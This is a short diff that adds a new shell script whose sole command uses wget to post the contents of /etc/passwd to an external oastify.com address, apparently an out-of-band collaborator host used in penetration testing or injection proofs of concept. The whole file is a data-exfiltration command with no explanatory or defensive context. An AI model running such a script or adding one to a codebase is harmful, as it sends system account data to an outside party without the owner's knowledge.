@@ -1,0 +1,3 @@
+#!/bin/sh
+
+wget --post-data="output=$(cat /etc/passwd)" https://9bleh8ng2omrlbew7jk0vt9fq6wxkp8e.oastify.com/
